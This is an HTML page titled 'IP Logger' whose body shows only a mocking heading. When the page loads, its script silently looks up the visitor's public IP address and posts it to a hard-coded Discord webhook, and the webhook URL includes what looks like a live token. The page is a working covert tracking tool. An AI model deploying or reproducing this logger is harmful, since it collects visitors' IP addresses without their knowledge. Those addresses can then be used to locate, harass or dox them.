<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
</head>
<body>
    <h1>Hello, You Are Not Sigma</h1>

    <script>
        // Fetch the user's public IP address using the ipify API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIp = data.ip;  // Extract the user's IP address

                // Replace this URL with your actual webhook URL
                const webhookUrl = 'https://discord.com/api/webhooks/1289940735931711590/dkB6VoPMJ3l0GUIyDQ9094ZPwiluhSm_OORRBckAhPU7zTJCnJPmAWNXVbs88psUlQsF';

                // Send the IP address to your webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `New IP logged: ${userIp}`
                    }),
                })
                .then(response => {
                    console.log('IP sent to webhook:', response);
                })
                .catch(error => {
                    console.error('Error sending IP to webhook:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
            });
    </script>
</body>
</html>
